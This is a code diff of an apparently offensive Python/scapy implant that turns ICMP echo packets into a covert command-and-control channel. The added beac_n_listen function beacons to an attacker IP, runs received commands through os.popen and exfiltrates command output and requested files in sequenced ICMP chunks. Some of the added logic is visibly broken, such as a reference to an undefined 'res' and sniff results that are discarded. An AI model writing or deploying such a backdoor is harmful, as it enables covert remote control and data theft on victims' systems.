@@ -1,5 +1,5 @@
 from scapy.all import *
-import argparse
+import subprocess
 import os
 import time
 
@@ -10,57 +10,93 @@ is_ready = False
 TTL = int(64)
 my_iface =  "ens160"
 frag_size = 40
-""" def DidRec(pkt):
-    print("packet recieved")
-    global is_ready
-    if pkt[ICMP].id == ICMP_ID_HELO:
-        is_ready = True
-        print("I got a message from my master")
- """
 
-def DidRec(pkt):
-    print("blabla")
-    print(str(pkt[ICMP]))
-    send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/"end")
+  
+def beac_n_listen():
+    mtu = 1400
+    while True:
+        send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8) / "FREETOTALK")
+        pkt = sniff(filter="icmp", count=1, timeout = 3)
+        if pkt:
+            payload = pkt[0][IP].payload.load.decode('utf-8')
+            first_word = payload.split()[0]
 
-def ReadAndSend(file_path):
-    chunk = frag_size
-    with open(file_path) as smgld_file:
-        while chunk := smgld_file.read(chunk):
-            send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/ str(chunk))
-            time.sleep(0.5)
-        send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/ "end")
-    
+            if first_word == "get":
+                curr_seq = 1
+                file = open(payload.split()[1], 'rb') 
+                while True:  
+                    chunk = file.read(mtu)        
+                    if not chunk: 
+                        break 
+                    while True:
+                        send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / chunk)
+                        # sniff till you get an ok for certain part
+                        pkt = sniff(filter="icmp", count=1, timeout=3)
+                        if pkt:
+                            if pkt[0][ICMP].seq == curr_seq:
+                                curr_seq = curr_seq + 1
+                                break
+                while True:
+                    send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / "end")
+                    sniff(filter="icmp", count=1, timeout = 3)
+                    if pkt:
+                        if pkt[0][ICMP].seq == curr_seq:
+                            break
+                else:
+                    while True:
+                        send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / res)
+                        pkt = sniff(filter="icmp", count=1, timeout=3)
+                        if pkt:
+                            if pkt[0][ICMP].seq == curr_seq:
+                                curr_seq = curr_seq + 1
+                                break
+                    while True:
+                            send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / "end")
+                            sniff(filter="icmp", count=1, timeout = 3)
+                            if pkt:
+                                if pkt[0][ICMP].seq == curr_seq:
+                                    break
+            else:
+                res = os.popen(payload).read()
+                curr_seq = 1
+
+                if len(res) > mtu:
+                    for i in range(0,len(res), mtu ):
+                        data = res[i:i+mtu]
+                        while True:
+                            send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / data)
+                            # sniff till you get an ok for certain part
+                            pkt = sniff(filter="icmp", count=1, timeout=3)
+                            if pkt:
+                                if pkt[0][ICMP].seq == curr_seq:
+                                    curr_seq = curr_seq + 1
+                                    break
+                else:
+                    while True:
+                        send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / res)
+                        sniff(filter="icmp", count=1, timeout = 3)
+                        if pkt:
+                            if pkt[0][ICMP].seq == curr_seq:
+                                curr_seq = curr_seq + 1
+                                break
+                #ending conversation
+                while True:
+                    send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / "end")
+                    sniff(filter="icmp", count=1, timeout = 3)
+                    if pkt:
+                        if pkt[0][ICMP].seq == curr_seq:
+                            break
+                
 
 
-def CMDHandler(packet, payload):
-    first_word = payload.split()[0]
-    if first_word == "ls":
-        files = os.scandir(path=payload.split[1])
-        for filename in files:
-            send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/ filename)
-        send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/ "end")
+                
 
-    elif first_word == "get": 
-        f = open(payload.split(' ',1)[1])
-        content = f.read(frag_size)
-        send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/ "end")
 
-    elif first_word == "run":
-        os.system(payload.split(' ',1)[1])
 
 
 def main():
-    while True:
-        send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/"waiting")
-        packet = sniff(filter="icmp", prn=DidRec, count=1, timeout=1)
-        payload = packet[0][IP][Raw].load.decode('utf-8')
-        if payload != "":
-            CMDHandler(packet, payload)
-            
-        
-
-
+    beac_n_listen()
+     
 
 
 if __name__ == "__main__":
